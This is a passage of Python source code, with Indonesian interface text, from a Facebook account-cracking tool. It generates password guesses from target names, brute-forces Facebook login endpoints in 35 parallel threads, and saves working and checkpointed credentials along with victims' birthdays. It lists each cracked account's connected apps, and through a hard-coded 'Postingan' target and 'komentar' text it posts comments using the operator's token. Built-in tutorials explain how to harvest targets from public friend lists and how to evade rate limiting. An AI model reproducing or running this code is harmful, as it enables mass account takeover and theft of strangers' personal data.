                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:syafii.append(nb+"123");syafii.append(nb+"12345")
                else:syafii.append(nb);syafii.append(nb+"123");syafii.append(nb+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):syafii.append(nd+x);syafii.append(nb+x)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):syafii.append(z)
            syafii.append(user.lower())
            return syafii
        except:return syafii
    
###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sPass Manual %s[ %s1 Kata %s]'%(K,P,K,P,K,A,K))
    pass_manual1 = input('%s╠══[%s••%s] %sMasukkan Sandi : '%(K,P,K,P))
    print('%s╠══[%s•%s] %sPass Manual %s[ %sBelakang Nama %s]'%(K,P,K,P,K,A,K))
    pass_manual2 = input('%s╠══[%s••%s] %sMasukkan Sandi : '%(K,P,K,P))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)
    
###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    ua = open('tool/ugent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/ugent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Instagram ---#
    ua = open('tool/ugent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?api_key=124024574287414&skip_api_login=1&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?app_id=124024574287414&refsrc=deprecated&app_id=124024574287414&lwv=100&refid=9', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))

###----------[ CHECK APP ]---------- ###
class cek_aplikasi:
    def __init__(self,data,denventa):
        self.cookie = {"cookie" : denventa}
        self.daftar_aktif, self.daftar_inaktif, self.daftar_dihapus   = [], [], []
        language(self.cookie)
        try: # --- [ Cek Aplikasi Aktif ] --- #
            self.daftar_aktif.append('\n    %s[%sAktif%s]'%(H,P,H))
            url1 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
            self.apk_active(url1)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Kadaluwarsa ] --- #
            self.daftar_inaktif.append('\n    %s[%sKadaluwarsa%s]'%(J,P,J))
            url2 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
            self.apk_inactive(url2)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Dihapus ] --- #
            self.daftar_dihapus.append('\n    %s[%sDihapus%s]'%(M,P,M))
            url3 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
            self.apk_dihapus(url3)
        except Exception as e:pass
        try: # --- [ Print All ] --- #
            print(data + self.dft1 + self.dft2 + self.dft3)
        except Exception as e:
            print(data)
    def apk_active(self,url):
        with requests.Session() as xyz:
            try:
                par1 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh1 in par1.find_all('h3'):
                    if 'Ditambahkan' in hhh1.text:
                        ingfo1 = '\n      ⟶  '+str(hhh1.text).replace('Ditambahkan pada ',' [') + ']'
                        ingfo1 = ('\n      %s⟶  %s%s]'%(H,P,str(hhh1.text).replace('Ditambahkan pada ',' [')))
                        self.daftar_aktif.append(ingfo1)
                    else:continue
                next = 'https://mbasic.facebook.com' + par1.find('a',string='Lihat Lainnya')['href']
                self.apk_active(next)
            except: pass
        if len(self.daftar_aktif) == 1:self.dft1 = ''
        else:self.dft1 = ''.join(self.daftar_aktif)
    def apk_inactive(self,url):
        with requests.Session() as xyz:
            try:
                par2 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh2 in par2.find_all('h3'):
                    if 'Kedaluwarsa' in hhh2.text:
                        ingfo2 = '\n      ⟶  '+str(hhh2.text).replace('Kedaluwarsa pada ',' [') + ']'
                        ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Kedaluwarsa pada ',' [')))
                        self.daftar_inaktif.append(ingfo2)
                    else:continue
                next = 'https://mbasic.facebook.com' + par2.find('a',string='Lihat Lainnya')['href']
                self.apk_inactive(next)
            except: pass
        if len(self.daftar_inaktif) == 1:self.dft2 = ''
        else:self.dft2 = ''.join(self.daftar_inaktif)
    def apk_dihapus(self,url):
        with requests.Session() as xyz:
            try:
                par3 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh3 in par3.find_all('h3'):
                    if 'Dihapus' in hhh3.text:
                        ingfo3 = '\n      ⟶  %s'+str(hhh3.text).replace('Dihapus: ',' [') + ']'
                        ingfo3 = ('\n      %s⟶  %s%s]'%(M,P,str(hhh3.text).replace('Dihapus: ',' [')))
                        self.daftar_dihapus.append(ingfo3)
                    else:continue
                next = 'https://mbasic.facebook.com' + par3.find('a',string='Lihat Lainnya')['href']
                self.apk_dihapus(next)
            except: pass
        if len(self.daftar_dihapus) == 1:self.dft3 = ''
        else:self.dft3 = ''.join(self.daftar_dihapus)
        
###----------[ CRACK ]---------- ###
class crack:
    def __init__(self):
        global OK,CP
        self.ok = OK
        self.cp = CP
        self.lp = 0
        try:
            self.file = file_dump
            self.open = open(self.file,'r').read().splitlines()
        except Exception as e:
            kecuali(e)
        self.sementara = []
        if urutan_crack == '1':
            for dvt in self.open:
                try:
                    self.sementara.insert(0,dvt)
                except Exception as e:continue
        elif urutan_crack == '2':
            for dvt in self.open:
                try:
                    urut = random.randint(0,len(self.sementara))
                    self.sementara.insert(urut,dvt)
                except Exception as e:continue
        else:
            for dvt in self.open:
                try:
                    self.sementara.append(dvt)
                except Exception as e:continue
        print('%s║'%(B))
        print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(K,P,K,P))
        print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.json'%(K,P,K,P,tanggal))
        print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.json'%(K,P,K,P,tanggal))
        print('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(K,P,K,P))
        self.Mulai_Jalan = datetime.now()
        with ThreadPoolExecutor(max_workers=35) as qwerty:
            for dvt in self.sementara:
                try:
                    id = dvt.split("=")[0]
                    pw = password(dvt.split("=")[1])
                    qwerty.submit(self.start_crack,id,pw)
                except Exception as e:continue
        exit()
    def start_crack(self,id,list_pw):
        try:
            for pw in list_pw:
                if sistem_login   == 'satu' : log = logger1(id,pw)
                elif sistem_login == 'dua'  : log = logger2(id,pw)
                elif sistem_login == 'tiga' : log = logger3(id,pw)
                else:log = logger1(id,pw)
                if log['status'] == 'cp':
                    if sakura != 159384:pass
                    else:
                        files_cp = "CP/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pcp = ('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
                        print(pcp)
                        self.cp.append("%s=%s"%(id,pw))
                        open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                elif log['status'] == 'ok':
                    if sakera != 159369:pass
                    else:
                        files_ok = "OK/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pok = ('\r   %s──> %s • %s%s               '%(H,id,pw,ttl))
                        cek_aplikasi(pok,cvt3(log["cookies"]))
                        self.ok.append("%s=%s"%(id,pw))
                        open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                else:
                    if sakara != 159375:print(CoY)
                    else:continue
            self.lp += 1
            loop = str(self.lp)
            alls = str(len(self.sementara))
            jum_ok = str(len(self.ok))
            jum_cp = str(len(self.cp))
            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,P,Total_Waktu,K,P,(loop),(alls),K,P,(jum_ok),K,P,(jum_cp),K,P), end='');sys.stdout.flush()
        except Exception as e:
            self.start_crack(id,list_pw)

def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(K,P,K,P,K))
    mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(K,P,K,P,K))
    mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(K,P,K,P,K))
    mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(K,P,K,P,K))
    mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(K,P,K,P,K))
    mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(K,P,K,P,K))
    mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(K,P,K,P,K))
    mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(K,P,K,P,K))
    mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(K,P,K,P,K))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(K))
    input('%s╚══[%s•%s] %s[%sTekan Enter Kembali%s]%s'%(K,P,K,P,K,P,K));menu()
    
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(K,P,K,P,K))
    mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(K,P,K,P,K))
    mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(K,P,K,P,K))
    mlaku('%s║ %s4 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(K,P,K,P,K))
    mlaku('%s║ %s5 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(K,P,K,P,K))
    mlaku('%s║ %s6 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(K,P,K,P,K))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(B))
    input('%s╚══[%s•%s] %s[%sTekan Enter Kembali%s]%s'%(K,P,K,P,K,P,K));menu()

def membuat_sc():
    resik()
    banner()
    mlaku('%s║'%(B))
    mlaku('%s║'%(B))
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(U,P,U))
    mlaku('%s║'%(B))
    mlaku('%s╠══[%s•%s] %sAuthor Paling ganteng😁:'%(U,P,U,P))
    mlaku('%s║     • %sMuhammad Syafii'%(U,P))
    mlaku('%s║     • %sFikri Syahputra Sinaga'%(U,P))
    mlaku('%s║     • %sDapunta Khurayra X'%(U,P))
    mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(U,P))
    mlaku('%s║'%(B))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(U,P,U,P,U,P))
    mlaku('%s║     • %sAngga Kurniawan'%(U,P))
    mlaku('%s║     • %sYayan XD'%(U,P))
    mlaku('%s║     • %sBoy Hamzah'%(U,P))
    mlaku('%s║     • %sLatip Harkat'%(U,P))
    mlaku('%s║     • %sZacky Tricker'%(U,P))
    mlaku('%s║     • %sRizky Dev'%(U,P))
    mlaku('%s║     • %sIqbal Dev'%(U,P))
    mlaku('%s║     • %sFallen'%(U,P))
    mlaku('%s║     • %sHanifan'%(U,P))
    mlaku('%s║     • %sRizky Leviathan'%(U,P))
    mlaku('%s║'%(B))
    input('%s╚══[%s•%s] %s[%sTekan Enter Kembali%s]%s'%(K,P,K,P,K,P,K));menu()
    
### Trigger
if __name__=='__main__':
    resik()
    mkdir_data_login()
    menu()
